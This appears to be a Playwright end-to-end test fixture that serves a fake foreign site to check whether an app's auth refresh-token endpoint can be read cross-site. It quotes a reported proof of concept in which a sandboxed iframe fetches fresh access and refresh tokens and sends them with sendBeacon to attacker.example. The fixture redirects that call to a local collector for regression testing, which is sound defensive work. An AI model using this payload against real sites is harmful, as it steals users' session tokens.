import http from 'node:http'
import type { AddressInfo } from 'node:net'
import { test as base } from '@playwright/test'
import type { ForeignSiteFixtures } from '../refresh-cross-site.spec.types'

const API_URL = process.env.E2E_API_URL ?? 'http://localhost:1401'

// A site the user does not trust. FOREIGN_HOST is mapped to this machine
// by the Chromium flag below, so the browser sees it as a different site from
// the app without touching /etc/hosts
export const FOREIGN_HOST = 'evil.test'
export const LOGIN_URL = `${API_URL}/module/auth/login`
export const REFRESH_URL = `${API_URL}/module/auth/refresh/token`

const framedScript = `
  addEventListener('message', () => {
    fetch('${REFRESH_URL}', { method: 'POST', credentials: 'include' })
      .then((r) => r.json())
      .then(
        (body) => parent.postMessage({ read: true, body }, '*'),
        () => parent.postMessage({ read: false }, '*'),
      )
  }, { once: true })
`

const pageHtml = `<!doctype html>
<title>Foreign site</title>
<script>addEventListener('message', (e) => { window.refreshResult = e.data })</script>
<iframe sandbox="allow-scripts" srcdoc="<script>${framedScript.replace(/"/g, '&quot;')}</script>"></iframe>`

// The proof of concept from community issue #154, character for character.
// Only its two placeholder addresses are swapped for the tested API and for
// the collector of this fixture when the page is served
const REPORTED_POC = `<!-- attacker page -->
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://taskview.example/api/module/auth/refresh/token', {
      method: 'POST', credentials: 'include'
    }).then(r => r.json()).then(t => {
      // attacker-readable response: fresh access + refresh token pair
      navigator.sendBeacon('https://attacker.example/collect', JSON.stringify(t));
    });
  </script>"></iframe>`

const reportedPocHtml = (origin: string) =>
  REPORTED_POC
    .replace('https://taskview.example/api/module/auth/refresh/token', REFRESH_URL)
    .replace('https://attacker.example/collect', `${origin}/collect`)

const readBody = async (req: http.IncomingMessage) => {
  const chunks: Buffer[] = []
  for await (const chunk of req) chunks.push(chunk as Buffer)
  return Buffer.concat(chunks).toString('utf8')
}

export const test = base.extend<ForeignSiteFixtures>({
  launchOptions: async ({ launchOptions }, use) => {
    await use({
      ...launchOptions,
      args: [...(launchOptions.args ?? []), `--host-resolver-rules=MAP ${FOREIGN_HOST} 127.0.0.1`],
    })
  },
  foreignSite: async ({}, use) => {
    const collected: string[] = []
    let origin = ''
    const server = http.createServer(async (req, res) => {
      if (req.url === '/collect') {
        collected.push(await readBody(req))
        res.writeHead(204).end()
        return
      }
      res
        .writeHead(200, { 'Content-Type': 'text/html' })
        .end(req.url === '/reported-poc' ? reportedPocHtml(origin) : pageHtml)
    })
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
    origin = `http://${FOREIGN_HOST}:${(server.address() as AddressInfo).port}`
    await use({ url: `${origin}/`, reportedPocUrl: `${origin}/reported-poc`, collected })
    await new Promise((resolve) => server.close(resolve))
  },
})

export { expect } from '@playwright/test'
